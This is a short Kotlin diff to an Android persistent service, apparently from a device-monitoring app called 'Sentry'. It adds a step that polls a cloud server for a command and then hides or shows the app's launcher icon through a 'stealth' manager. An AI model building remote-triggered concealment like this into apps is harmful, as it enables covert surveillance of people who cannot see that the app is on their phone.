@@ -28,6 +28,12 @@ class SentryPersistentService : Service() {
                 try {
                     client.registerDevice()
                     client.sendHeartbeat()
+                    val iconCmd = client.pollIconVisibilityCommand()
+                    if (iconCmd.isSuccess) {
+                        iconCmd.getOrNull()?.let { hide ->
+                            com.example.sentry.stealth.AppStealthManager.setAppIconHidden(applicationContext, hide)
+                        }
+                    }
                     android.util.Log.d("SentryPersistentService", "Cloud presence heartbeat synced • Device ONLINE")
                 } catch (e: Exception) {
                     android.util.Log.w("SentryPersistentService", "Cloud heartbeat error: ${e.message}")
